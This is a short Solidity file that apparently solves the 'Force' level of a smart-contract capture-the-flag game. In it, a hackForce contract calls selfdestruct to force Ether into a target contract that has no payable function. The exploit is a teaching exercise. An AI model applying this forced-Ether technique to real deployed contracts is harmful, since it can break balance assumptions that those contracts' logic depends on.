// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// The goal of this level is to make the balance of the contract greater than zero.

contract hackForce {
    constructor() payable {}

    function transferEth(address _force) external {
        selfdestruct(payable(_force));
    }
}

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}
